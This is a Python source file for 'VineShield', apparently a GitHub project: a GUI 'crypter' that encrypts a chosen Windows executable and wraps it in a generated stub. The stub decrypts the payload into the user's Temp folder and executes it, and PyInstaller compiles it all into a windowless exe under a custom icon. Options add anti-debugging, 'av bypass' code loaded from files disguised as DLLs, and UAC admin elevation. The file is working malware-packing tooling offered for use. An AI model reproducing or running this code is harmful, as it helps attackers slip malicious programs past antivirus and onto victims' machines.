'''
 __      __ _                _____  _      _        _      _ 
 \ \    / /(_)              / ____|| |    (_)      | |    | |
  \ \  / /  _  _ __    ___ | (___  | |__   _   ___ | |  __| |
   \ \/ /  | || '_ \  / _ \ \___ \ | '_ \ | | / _ \| | / _` |
    \  /   | || | | ||  __/ ____) || | | || ||  __/| || (_| |
     \/    |_||_| |_| \___||_____/ |_| |_||_| \___||_| \__,_| 
                 
by Nick-Vinesmoke
github: https://github.com/Nick-Vinesmoke
original: https://github.com/Nick-Vinesmoke/VineShield
'''

from tkinter import *
import customtkinter as gui
from PIL import ImageTk, Image
import webbrowser
import time
import threading
import shutil
from tkinter import filedialog
from cryptography.fernet import Fernet
#from ctypes import windll, byref, sizeof, c_int
import os

class GUI:
    def __init__(self, theme = 'themes/theme.json', mode = 'dark', geometry = "500x429+560+240") -> None:
        self.geometry = geometry
        self.theme = theme
        if self.theme == 'themes/theme.json':
            self.varTheme = 'transparent'
        else:
            self.varTheme = 'colored'
        self.mode = mode
        self.Menu()

    def WinConfig(self) -> None:
        self.win.geometry(self.geometry)  
        self.win.minsize(500,400)
        self.win.title("VineShield") 
        self.win.resizable(False, False)  
        self.win.iconbitmap('img_files/icon.ico')  
        gui.set_appearance_mode(self.mode)
        gui.set_default_color_theme(self.theme)
        if self.mode == 'dark':
            self.win.configure(fg_color="#242424")
        if self.mode == 'light':
            self.win.configure(fg_color="#F2F2F2")

        #self.HWND = windll.user32.GetParent(self.win.winfo_id())
        #barCol = 0x000000FF
        #windll.dwmapi.DwmSetWindowAttribute(self.HWND, 35, byref(c_int(barCol)), sizeof(c_int))
    
    def Widgets(self):
        gitimage = gui.CTkImage(light_image=Image.open("img_files/git1.png"),dark_image=Image.open("img_files/git.png"),size=(30, 30))
        gitbut = gui.CTkButton(master=self.win,text = '',image=gitimage,font=('Arial Rounded MT bold', 18),width = 1,command=self.Git,corner_radius = 8)
        gitbut.place(x=230, y= 5)

        disimage = gui.CTkImage(light_image=Image.open("img_files/discord1.png"),dark_image=Image.open("img_files/discord.png"),size=(30, 25))
        disbut = gui.CTkButton(master=self.win,text = '',image=disimage,font=('Arial Rounded MT bold', 18),width = 1, height=40,command=self.Discord,corner_radius = 8)
        disbut.place(x=230, y=60)

        self.setMode = gui.StringVar(value=self.mode)
        mode = gui.CTkComboBox(master=self.win,values=["dark","light"],variable=self.setMode,command=self.ModeChanger,height = 40)
        mode.place(x= 300, y= 5)

        self.setTheme = gui.StringVar(value=self.varTheme)
        themes = gui.CTkComboBox(master=self.win,values=["transparent","colored"],variable=self.setTheme,command=self.ThemeChanger,height = 40)
        themes.place(x= 300, y= 60)

        main = gui.CTkFrame(master=self.win, width=260, height=130, corner_radius= 25, border_width=2)
        main.place(x= 0, y= 120)

        header1 = gui.CTkLabel(master=self.win, text = "Main", font=('Arial Rounded MT bold', 24),bg_color= ['#E5E5E5','#212121'])
        header1.place(x= 13, y= 125)

        self.fileVar = gui.StringVar(value="select file")
        fileSelecter = gui.CTkButton(master=self.win, textvariable=self.fileVar,font=('Arial Rounded MT bold', 18), corner_radius = 8, bg_color= ['#E5E5E5','#212121'], command= self.SelectFile)
        fileSelecter.place(x= 100, y= 130)

        self.iconVar = gui.StringVar(value="select icon")
        iconSelecter = gui.CTkButton(master=self.win, textvariable=self.iconVar,font=('Arial Rounded MT bold', 18), corner_radius = 8, bg_color= ['#E5E5E5','#212121'], command= self.SelectIcon)
        iconSelecter.place(x= 100, y= 170)

        self.fileName = gui.CTkEntry(master=self.win,font=('Arial Rounded MT bold', 14), bg_color= ['#E5E5E5','#212121'], placeholder_text= 'output file name')
        self.fileName.place(x= 100, y= 210)

        deps = gui.CTkFrame(master=self.win, width=260, height=130, corner_radius= 25, border_width=2)
        deps.place(x= 0, y= 260)
        
        header2 = gui.CTkLabel(master=self.win, text = "Dependencies", font=('Arial Rounded MT bold', 24),bg_color= ['#E5E5E5','#212121'])
        header2.place(x= 13, y= 265)

        install = gui.CTkButton(master = self.win, text= "install deps",font=('Arial Rounded MT bold', 18), corner_radius = 8, bg_color= ['#E5E5E5','#212121'], command=self.Install)
        install.place(x= 100, y= 300)

        show = gui.CTkButton(master = self.win, text= "show deps",font=('Arial Rounded MT bold', 18), corner_radius = 8, bg_color= ['#E5E5E5','#212121'], command=self.Show)
        show.place(x= 100, y= 340)

        funcs = gui.CTkFrame(master=self.win, width=220, height=310, corner_radius= 25, border_width=2)
        funcs.place(x= 280, y= 120)

        header3 = gui.CTkLabel(master=self.win, text = "Functions", font=('Arial Rounded MT bold', 24),bg_color= ['#E5E5E5','#212121'])
        header3.place(x=293, y= 125)

        self.urlEnter = gui.CTkEntry(master=self.win,font=('Arial Rounded MT bold', 14), bg_color= ['#E5E5E5','#212121'], width= 200)
        self.urlEnter.insert(0,'enter url')
        self.urlEnter.configure(state="disabled")
        self.urlEnter.place(x= 293, y= 190)

        self.urlButt = gui.CTkCheckBox(master=self.win, text = "open url", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'], command= self.SetUrl)
        self.urlButt.place(x=293, y= 160)


        self.messageEnter = gui.CTkEntry(master=self.win,font=('Arial Rounded MT bold', 14), bg_color= ['#E5E5E5','#212121'], width= 200)
        self.messageEnter.insert(0,'enter message')
        self.messageEnter.configure(state="disabled")
        self.messageEnter.place(x= 293, y= 260)

        self.messageButt = gui.CTkCheckBox(master=self.win, text = "open message", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'], command= self.SetMessage)
        self.messageButt.place(x=293, y= 230)

        self.uacButt = gui.CTkCheckBox(master=self.win, text = "uac admin", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'])
        self.uacButt.place(x=293, y= 310)


        self.debugButt = gui.CTkCheckBox(master=self.win, text = "anti-debug", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'])
        self.debugButt.place(x=293, y= 350)

        self.bypassButt = gui.CTkCheckBox(master=self.win, text = "av bypass", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'])
        self.bypassButt.place(x=293, y= 390)

        start = gui.CTkButton(master = self.win, text= "obfuscate",font=('Arial Rounded MT bold', 24), corner_radius = 8, width= 200, command=self.AsyncRun)
        start.place(x= 30, y= 394)

    def AsyncRun(self):
        threading.Thread(target=self.ObfuscateWin).start()
        
    def ObfuscateWin(self):
        self.frame = gui.CTkFrame(master=self.win, width=250, height=100, corner_radius= 25, border_width=2)
        self.frame.place(relx= 0.5, rely= 0.5, anchor=CENTER)

        self.loadText = gui.StringVar(value='starting...')
        self.header = gui.CTkLabel(master=self.win, textvariable = self.loadText, font=('Arial Rounded MT bold', 24),bg_color= ['#E5E5E5','#212121'])
        self.header.place(relx= 0.5, rely= 0.45, anchor=CENTER)


        self.progressbar = gui.CTkProgressBar(master=self.win, orientation="horizontal")
        self.progressbar.set(0)
        self.progressbar.place(relx= 0.5, rely= 0.55, anchor=CENTER)

        threading.Thread(target=self.Obfuscate).start()

    def Obfuscate(self):
        try:
            if self.fileName.get() == '' or self.file == '':
                print(0/0)
            self.loadText.set('keying...')
            key = Fernet.generate_key()
            f = Fernet(key)
            self.progressbar.set(0.01)

            self.loadText.set('crypting...')
            with open(self.file, 'rb') as file:
                file_data = file.read()
            encrypted_data = f.encrypt(file_data) 
            new_name = f.encrypt(self.fileName.get().encode())
            os.mkdir("cache")
            with open(f"cache/enc_{self.fileName.get()}", 'wb') as file:
                file.write(encrypted_data)
            self.progressbar.set(0.1)

            self.loadText.set('creating code...')
            self.imports = '''from cryptography.fernet import Fernet
import os, sys
import subprocess
'''
            self.code = ''''''

            self.progressbar.set(0.15)

            if self.debugButt.get() == 1:
                print("debug")
                dll = open('dlls/vm_expro_.dll', 'r')
                context = dll.read()
                arr = context.split("x&x&x&x")
                self.imports += arr[0]+'\n'
                self.code = arr[1]+'\n'+self.code+"\nAntiDebug()\n"

            self.progressbar.set(0.20)

            if self.bypassButt.get() == 1:
                print("bypass")
                dll = open('dlls/vm_inpro_.dll', 'r')
                context = dll.read()
                arr = context.split("x&x&x&x")
                self.imports += arr[0]+'\n'
                self.code = arr[1]+'\n'+self.code+"\nAvByPass()\n"

            self.progressbar.set(0.25)

            if self.urlButt.get() == 1:
                print("url")
                self.imports += '\nimport webbrowser\n'
                self.code = self.code+f"webbrowser.open('{self.urlEnter.get()}', new=2)\n\n"

            self.progressbar.set(0.30)

            if self.messageButt.get() == 1:
                print("message")
                self.imports +='\nfrom tkinter import messagebox\n'
                self.code = self.code+f'messagebox.showinfo("Attention", f"{self.messageEnter.get()}")\n\n'
            
            self.progressbar.set(0.35)


            context = rf'''key = {key}
f = Fernet(key)

name = f.decrypt({new_name}).decode()
try:
    base_path = sys._MEIPASS
except Exception:
    base_path = os.path.abspath(".")
sa = os.path.join(base_path, "enc_" + name)


 
with open(sa, 'rb') as file:
    encrypted_data = file.read()

decrypted_data = f.decrypt(encrypted_data)

with open(r"C:\Users\\" + os.environ.get('USERNAME') + r"\AppData\Local\Temp\ceche_" + name, 'wb') as file:
    file.write(decrypted_data)
subprocess.call(r"C:\Users\\" + os.environ.get('USERNAME') + r"\AppData\Local\Temp\ceche_" + name)

os._exit(0)
            '''

            self.code = self.imports+"\n"+self.code+'\n'+context
            self.progressbar.set(0.40)

            file = open(f'cache/{self.fileName.get()}.py','w')
            file.write(self.code)
            file.close()

            self.progressbar.set(0.50)
            
            self.loadText.set('compiling...')
            os.mkdir("obfuscated")
            command = fr'pyinstaller -F -w --add-data "cache/enc_{self.fileName.get()};." '
            if self.uacButt.get() == 1:
                command+='--uac-admin '
            try:
                if self.icon != '':
                    command+=f'-i "{self.icon}" '
                else:
                    print(0/0)
            except:
                command+=f'-i "img_files/icon.ico" '
                
            command += f'"cache/{self.fileName.get()}.py"'
            os.system(command)

            self.progressbar.set(0.60)
            while not os.path.exists(f'dist/{self.fileName.get()}.exe'):
                pass
            self.progressbar.set(0.90)
            if os.path.exists(f'dist/{self.fileName.get()}.exe'):
                time.sleep(10)
                shutil.move(f'dist/{self.fileName.get()}.exe', "obfuscated/")
            self.progressbar.set(1)
            self.loadText.set('ending...')
            self.frame.after(1000,  self.frame.destroy)
            self.progressbar.after(1000,  self.progressbar.destroy)
            self.header.after(1000,  self.header.destroy)
        except Exception as e:
            self.progressbar.set(1)
            self.loadText.set("Error")
            print(e)
            self.frame.after(3000,  self.frame.destroy)
            self.progressbar.after(3000,  self.progressbar.destroy)
            self.header.after(3000,  self.header.destroy)
        try:
            shutil.rmtree("dist")
            shutil.rmtree("ceche")
        except:
            pass

    def SetMessage(self):
        if self.messageButt.get() == 0:
            self.messageEnter.configure(state="disabled")
        else:
            self.messageEnter.configure(state="normal")

    def SetUrl(self):
        if self.urlButt.get() == 0:
            self.urlEnter.configure(state="disabled")
        else:
            self.urlEnter.configure(state="normal")


    def Show(self):
        os.startfile(f"{os.getcwd()}/deps/deps.txt")
    
    def Install(self):
        os.startfile(f"{os.getcwd()}/deps/install.bat")

    def SelectFile(self):
        self.file = filedialog.askopenfilename(title="select file.exe",defaultextension=".exe",filetypes=[("executable files","*.exe *.bat *.vbs *.cmd")])
        if self.file != '':
            index = self.file.rfind('/')
            text = self.file[index+1:]
            if len(text) < 15:
                self.fileVar.set(text)
            else:
                text = text[:11]
                text+= '...'
                self.fileVar.set(text)
        else:
            self.fileVar.set("not selected")
    
    def SelectIcon(self):
        self.icon = filedialog.askopenfilename(title="select file.ico",defaultextension=".ico",filetypes=[("icon files",".ico")])
        if self.icon != '':
            index = self.icon.rfind('/')
            text = self.icon[index+1:]
            if len(text) < 15:
                self.iconVar.set(text)
            else:
                text = text[:11]
                text+= '...'
                self.iconVar.set(text)
        else:
            self.iconVar.set("not selected")

    def ThemeChanger(self,buf):
        geometry = self.win.geometry()
        if buf == "transparent":
            self.win.destroy()
            GUI('themes/theme.json', self.setMode.get(),geometry)
        if buf == "colored":
            self.win.destroy()
            GUI('themes/theme1.json',self.setMode.get(),geometry)
    
    def ModeChanger(self, buf):
        geometry = self.win.geometry()
        if buf == "dark":
            self.win.destroy()
            GUI(self.theme, "dark",geometry)
        if buf == "light":
            self.win.destroy()
            GUI(self.theme, "light",geometry)

    def Git(self):
        webbrowser.open('https://github.com/Nick-Vinesmoke', new=2)
    
    def Discord(self):
        webbrowser.open('https://discord.gg/ufvyg5F2j4', new=2)

    def Menu(self) -> None:

        self.win = gui.CTk()
        self.WinConfig()
        self.Widgets()

        frame = gui.CTkFrame(master=self.win, width=260, height=130, fg_color="black", corner_radius= 25)
        frame.place(x=-45, y=-20)
        canvas = gui.CTkCanvas(master=self.win,width=256, height=128, background='white', highlightthickness=0)
        canvas.place(x=0, y=0)
        image = Image.open("img_files/logo.png")
        image = image.resize((256, 128))
        image = ImageTk.PhotoImage(image)
        canvas.create_image(128, 64, image=image)

        self.win.mainloop()